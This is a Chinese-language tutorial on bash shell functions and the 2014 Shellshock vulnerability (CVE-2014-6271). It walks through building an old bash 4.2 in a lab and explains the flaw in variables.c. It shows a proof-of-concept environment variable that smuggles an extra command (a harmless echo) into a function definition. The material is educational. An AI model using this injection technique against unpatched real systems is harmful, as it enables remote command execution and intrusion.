#
#### shell函数
shell程序是一个命令行解释器，从终端读取并执行命令。  
目前存在许多不同类型的shell程序：sh、bash、csh、zsh等。  
这些程序中的函数被称为shell函数。  
```
shan@shan-GV62-8RC:~$ foo() { echo "hello shan";}  
shan@shan-GV62-8RC:~$ declare foo
shan@shan-GV62-8RC:~$ declare -f foo  # 打印函数
foo () 
{ 
    echo "hello shan"
}
shan@shan-GV62-8RC:~$ foo
hello shan
shan@shan-GV62-8RC:~$ unset foo  # 删除函数
```

!!! warning
    foo() { echo "hello shan";} 左边大括号后必须有空格，后面必须要分号。


&emsp;

**给子进程传入函数的两种方式**  

第一种:父进程定义好函数，通过export给到子进程
```
shan@shan-GV62-8RC:~$ foo() { echo "hello shan";}
shan@shan-GV62-8RC:~$ bash
shan@shan-GV62-8RC:~$ foo  # 子进程

Command 'foo' not found, did you mean:

  command 'roo' from snap roo (2.0.3)
  command 'fio' from deb fio (3.16-1)
  command 'fop' from deb fop (1:2.4-2)
  command 'goo' from deb goo (0.155+ds-1)

See 'snap info <snapname>' for additional versions.

shan@shan-GV62-8RC:~$ exit
exit
shan@shan-GV62-8RC:~$ foo
hello shan
shan@shan-GV62-8RC:~$ export -f foo  # -f代表变量名称为函数名称。
shan@shan-GV62-8RC:~$ bash
shan@shan-GV62-8RC:~$ foo  # 子进程
hello shan
```

第二种:定义一种特殊格式的变量。该变量在父进程中只是变量。但是给到子进程后会解析成函数。  
该情况只能在有漏洞的版本试验，现版本中已经修复。所以直接在下面shellshcok漏洞里演示。  



&emsp;
#### shellshcok漏洞
shellshcok漏洞2014年9月24日被公开，CVE-2014-6271。它就是利用了上述bash将环境变量转为函数定义时的犯的错误。不过通常shellshock泛指所有和bash相关的漏洞。

!!! CVE-2014-6271影响版本
    所有安装GNU bash 版本小于或者等于4.3的Linux操作系统。
    
    
安装一个小于4.3版本的bash实验。http://www.gnu.org/software/bash/bash.html  
```
ubuntu@VM-0-17-ubuntu:~$ wget https://mirrors.kernel.org/gnu/bash/bash-4.2.tar.gz
ubuntu@VM-0-17-ubuntu:~$ tar -zxvf bash-4.2.tar.gz 
ubuntu@VM-0-17-ubuntu:~$ cd bash-4.2/
ubuntu@VM-0-17-ubuntu:~/bash-4.2$ ./configure --prefix=/home/ubuntu/bash4.2
ubuntu@VM-0-17-ubuntu:~/bash-4.2$ make && make install
ubuntu@VM-0-17-ubuntu:~$ sudo ln -s /home/ubuntu/bash4.2/bin/bash /usr/bin/bash_shellshock
ubuntu@VM-0-17-ubuntu:~$ bash_shellshock --version
GNU bash, version 4.2.0(1)-release (x86_64-unknown-linux-gnu)
```
```
ubuntu@VM-0-17-ubuntu:~$ foo='() { echo "hello shan";};echo "hacker"'
ubuntu@VM-0-17-ubuntu:~$ echo $foo
() { echo "hello shan";};echo "hacker"
ubuntu@VM-0-17-ubuntu:~$ foo

Command 'foo' not found, did you mean:

  command 'fio' from deb fio (3.16-1)
  command 'fop' from deb fop (1:2.4-2)
  command 'goo' from deb goo (0.155+ds-1)

Try: sudo apt install <deb name>

ubuntu@VM-0-17-ubuntu:~$ export foo
ubuntu@VM-0-17-ubuntu:~$ bash_shellshock 
hacker     # 额外的命令被执行了
ubuntu@VM-0-17-ubuntu:~$ foo
hello shan
```
**父进程传递给子进程变量，子进程解析。所以每次调用bash额外的命令都会被自行**

&emsp;

**漏洞原理**
漏洞存在于bash源码的variables.c文件中  
```
void initialize_shell_variables (env, privmode)
    char **env;
    int privmode;
{
    ...
    if (privmode == 0 && read_but_dont_execute == 0 && STREQN ("() {", string, 4))
    ...
    
    parse_and_execute (temp_string, name, SEVAL_NONINT|SEVAL_NOHIST);

}
```
当文件找到`() {`开的字符串时触发这个解析逻辑。  
一旦找到`() {`它会把`=`换成空格从而将环境变量变成函数。  
然后使用`parse_and_execute`函数解析，它不仅仅解析函数定义，当这个函数发现字符串中含有`;`隔开的shell命令就会区执行。  




